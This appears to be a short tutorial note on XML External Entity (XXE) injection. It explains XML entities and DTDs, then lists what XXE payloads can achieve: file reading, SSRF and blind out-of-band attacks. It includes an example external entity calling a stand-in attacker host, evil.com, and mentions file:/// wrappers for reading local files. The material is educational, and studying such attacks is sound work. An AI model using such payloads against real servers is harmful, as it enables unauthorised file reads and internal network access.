# XXE Injectionn

## Explanation

XML External Entity (XXE) injection is a vulnerability caused by attackers manipulating with the way servers process XML data. This can be used to read files, perform SSRF, or even RCE in some cases.

Some applications use XML to read transmit data between the browser and the server, and they do so via a library / API.

### XML Entities

Extensible Markup Language (XML) is a language designed for storing and transporting data. Today, it is declining in usage (but not totally zero!) due to JSON being more favourable. The structure of XML is similar to HTML with a tree structure of tags and data. Here's an example:

```xml
<?xml version="1.0" encoding="UTF-8">
<number>1</number>
```

The `<?xml version="1.0">` line is an XML declaration, and it used to indicate the version and the character encoding within the XML data. XML entities is just a representation of data within an XML document, using the `<>` characters. 

### Document Type Definition

The XML DTD contains declarations that define the structure of the document. It is declared in the optional `DOCTYPE` element, and is either **fully self-contained** (internal DTD) or **loaded externally** (external DTD). It can also be both.

### Custom and External entities

XML allows custom entities to be defined within the DTD:

```xml
<!DOCTYPE foo [ <!ENTITY me "you" > ]>
```

The above is referenced using `&me;`, similar to pointers in C. When referenced, the `&me;` will be replaced with the value `you` upon loading.

External entities are declared **outside of the DTD**. This uses the `SYSTEM` keyword, and a URL must be specified.

```xml
<!DOCTYPE foo [ <!ENTITY evil SYSTEM "http://evil.com/evil-payload" > ]>
```

The URL is not strict on using the `http://` wrapper. It can be replaced with `file:///` or `php:///` if needed. The above shows a method of which XXE injection can be abused for SSRF.

## Exploitation

There are quite a few payloads out there, and each of them can be used to perform:
* Arbitrary read of files
* SSRF into internal network OR external malicious pages
* Blind XXE via Out-of-Band payloads